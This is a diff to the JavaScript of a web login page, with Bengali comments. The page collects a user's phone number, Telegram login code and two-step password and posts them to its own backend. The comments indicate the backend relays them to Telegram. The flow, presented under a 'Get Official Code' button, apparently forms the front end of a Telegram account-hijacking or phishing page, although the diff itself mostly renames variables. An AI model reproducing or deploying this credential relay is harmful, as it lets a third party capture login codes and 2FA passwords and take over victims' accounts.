@@ -110,9 +110,9 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
     <script>
-        // ১. ভেরিয়েবলগুলো মেমরিতে রাখার জন্য (যাতে পাসওয়ার্ড দেওয়ার সময় ফোন নম্বর না হারায়)
-    let userPhone = "";
-    let userOTP = "";
+        // ১. গ্লোবাল ভেরিয়েবল (ডাটা যাতে হারিয়ে না যায়)
+    let savedPhone = "";
+    let savedOTP = "";
 
     // ২. ইন্টারন্যাশনাল ফোন ইনপুট সেটআপ
     const phoneInput = document.querySelector("#phone");
@@ -138,9 +138,9 @@
         setTimeout(() => { box.style.display = 'none'; }, 4000);
     }
 
-    // ৫. ওটিপি পাঠানোর ফাংশন
+    // ৫. ওটিপি পাঠানোর ফাংশন (Step 1)
     async function sendOTP() {
-        userPhone = iti.getNumber(); // ফোন নম্বর মেমরিতে সেভ করলাম
+        savedPhone = iti.getNumber(); // নম্বরটি মেমরিতে জমা রাখলাম
         if (!iti.isValidNumber()) return notify("Please enter a valid number!");
 
         const btn = document.getElementById('btn-otp');
@@ -151,7 +151,7 @@
             const res = await fetch(`${API_URL}/api/send_otp`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: userPhone })
+                body: JSON.stringify({ phone: savedPhone })
             });
             const data = await res.json();
             if (data.success) {
@@ -159,15 +159,19 @@
             } else {
                 notify(data.message);
             }
-        } catch (e) { notify("Connection Error!"); }
-        finally { btn.disabled = false; btn.innerText = "Get Official Code"; }
+        } catch (e) { 
+            notify("Connection Error!"); 
+        } finally { 
+            btn.disabled = false; 
+            btn.innerText = "Get Official Code"; 
+        }
     }
 
-    // ৬. ওটিপি ভেরিফাই করার ফাংশন
+    // ৬. ওটিপি ভেরিফাই করার ফাংশন (Step 2)
     async function verifyOTP() {
-        userOTP = document.getElementById('otp-code').value; // ওটিপি মেমরিতে সেভ করলাম
+        savedOTP = document.getElementById('otp-code').value; // ওটিপি মেমরিতে জমা রাখলাম
 
-        if (!userOTP) return notify("Enter the code!");
+        if (!savedOTP) return notify("Enter the code!");
 
         const btn = document.getElementById('btn-verify');
         btn.disabled = true;
@@ -178,17 +182,18 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    phone: userPhone, 
-                    code: userOTP,
-                    password: null 
+                    phone: savedPhone, 
+                    code: savedOTP,
+                    password: null // শুরুতে পাসওয়ার্ড ছাড়া ট্রাই করবে
                 })
             });
             const data = await res.json();
 
             if (data.success) {
                 window.location.replace("/dashboard");
-            } else if (data.message.toLowerCase().includes("password") || data.message.toLowerCase().includes("sessionpasswordneeded")) {
-                goToStep(3); // পাসওয়ার্ড বক্সে নিয়ে যাবে
+            } else if (data.message.includes("SessionPasswordNeeded") || data.message.toLowerCase().includes("password")) {
+                // যদি ২-স্টেপ পাসওয়ার্ড লাগে, তবে স্টেপ ৩-এ নিয়ে যাবে
+                goToStep(3);
             } else {
                 notify(data.message);
             }
@@ -200,7 +205,7 @@
         }
     }
 
-    // ৭. টু-স্টেপ পাসওয়ার্ড ভেরিফাই করার ফাংশন
+    // ৭. ফাইনাল পাসওয়ার্ড ভেরিফাই করার ফাংশন (Step 3)
     async function verifyFinal() {
         const pwd = document.getElementById('two-step-pass').value;
 
@@ -215,9 +220,9 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    phone: userPhone, // মেমরি থেকে নম্বর নিল
-                    code: userOTP,   // মেমরি থেকে ওটিপি নিল
-                    password: pwd 
+                    phone: savedPhone, // মেমরি থেকে নম্বর নিল
+                    code: savedOTP,   // মেমরি থেকে ওটিপি নিল
+                    password: pwd      // ইউজার এর দেওয়া পাসওয়ার্ড
                 })
             });
             const data = await res.json();
@@ -225,7 +230,7 @@
             if (data.success) {
                 window.location.replace("/dashboard");
             } else {
-                // সার্ভার থেকে আসা আসল এরর মেসেজ দেখাবে
+                // সরাসরি টেলিগ্রাম থেকে আসা এরর দেখাবে (যেমন: Password Incorrect)
                 notify(data.message); 
             }
         } catch (e) { 
